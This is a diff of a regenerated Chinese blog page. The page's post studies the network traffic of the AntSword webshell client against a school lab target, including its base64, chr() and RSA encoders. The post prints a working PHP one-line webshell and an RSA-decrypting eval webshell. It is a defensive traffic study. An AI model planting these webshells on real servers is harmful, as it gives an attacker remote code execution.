@@ -209,10 +209,10 @@
 
 <span id="more"></span>
 
-<h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>Wireshark &#x2F; Burp Suite （抓包工具，如果使用Burp需要在蚁剑设置代理）</p>
+<h2><span id="工具准备">工具准备</span></h2><p>Wireshark &#x2F; Burp Suite （抓包工具，如果使用Burp需要在蚁剑设置代理）</p>
 <p>中国蚁剑（AntSword）</p>
 <p>以及测试靶机（使用校内靶机进行测试）</p>
-<h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><p> 1.使用txt文档写一个简单的一句话木马</p>
+<h2><span id="开始测试">开始测试</span></h2><p> 1.使用txt文档写一个简单的一句话木马</p>
 <p><code>&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;</code></p>
 <p>然后修改成1.php</p>
 <p>2.随后上传至靶机，使用蚁剑连接。连接成功后打开虚拟终端</p>
@@ -227,7 +227,7 @@
 
 <span class="blur">又长又臭的一段代码</span>
 
-<h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><ul>
+<h2><span id="分析源码">分析源码</span></h2><ul>
 <li><p>开头：朴实无华的post（连接的密码）</p>
 </li>
 <li><p>存在有以下的特征：</p>
@@ -260,7 +260,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bin/sh</span><br><span class="line">cd <span class="string">&quot;/var/www/html&quot;</span>;cd /<span class="keyword">var</span>/www/html/;<span class="keyword">echo</span> d6fdb533a5e5;pwd;<span class="keyword">echo</span> <span class="number">230</span>ef1f</span><br><span class="line">第一个cd：文件路径</span><br><span class="line">第二个cd：输入的指令，前文中已有叙述</span><br><span class="line"><span class="keyword">echo</span>:应该是返回的随机数</span><br><span class="line">pwd：在linux命令中是查看当前路径</span><br></pre></td></tr></table></figure>
 
 <p>基本上只有简单的加密</p>
-<h2 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h2><p>在编码器中选择base64加密</p>
+<h2><span id="base64加密">Base64加密</span></h2><p>在编码器中选择base64加密</p>
 <p>wireshark抓包后的结果如下</p>
 <img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/6.png" class title="Base64加密">
 
@@ -270,11 +270,11 @@
 <img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/7.png" class title="base64解密">
 
 <p>可以看得出来，和明文是一样的</p>
-<h2 id="chr-加密"><a href="#chr-加密" class="headerlink" title="chr()加密"></a>chr()加密</h2><p>结果大同小异</p>
+<h2><span id="chr加密">chr()加密</span></h2><p>结果大同小异</p>
 <img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/8.png" class title="chr编码">
 
 <p>同样解码后还是经典的<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</code></p>
-<h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><p>在蚁剑的编码器管理中生成RSA密钥</p>
+<h2><span id="rsa加密">RSA加密</span></h2><p>在蚁剑的编码器管理中生成RSA密钥</p>
 <img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/5.png" class title="RSA加密">
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>];</span><br><span class="line"><span class="variable">$pk</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDjSec5p39mmIrvHqeve/mdoE8C</span></span><br><span class="line"><span class="string">NplDHfLvBRv9SAhSMFJtf636Z7MljxuN4tu7JNouqJRzQHpvPFPxRoNQqvUPvNS/</span></span><br><span class="line"><span class="string">+WYSPkrP4dFFCwmR6UP1Qq7oa1K/w/v7oCTKODVJMdKmXfumpupvV1AGIWW9Tn4K</span></span><br><span class="line"><span class="string">1VLzWRjeUHAHMaxgdwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$cmds</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$pk</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
@@ -398,6 +398,10 @@
             </div>
             
             
+            <div class="nav-next clearfix">
+                <a title=" Dest0g3 520 迎新赛部分write up" href="/2022/11/13/Destog3-520-迎新赛部分write-up/">下一篇 &gt;</a>
+            </div>
+            
         </nav>
     
     
@@ -498,7 +502,7 @@
                 文章
             </span>
             <span class="count">
-                4
+                5
             </span>
         </a>
         <a class="meta-item" href="/categories/">
@@ -514,7 +518,7 @@
                 标签
             </span>
             <span class="count">
-                4
+                6
             </span>
         </a>
     </div>
@@ -525,7 +529,7 @@
                 
   <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
     <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li></ul>
   </aside>
 
 
@@ -534,7 +538,7 @@
   <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
     <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
       <div class="tag-clouds">
-        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.8em;">POST</a> <a href="/tags/SQL-Injection/" style="font-size: 0.7em;">SQL_Injection</a>
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.8em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.6em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.7em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a>
       </div>
   </aside>
 
@@ -545,6 +549,12 @@
   <div class="tab-content">
       <ul class="list-group">
         
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/"><i class="fa  fa-book"></i> Dest0g3 520 迎新赛部分write up</a>
+            
+          
         
           
           
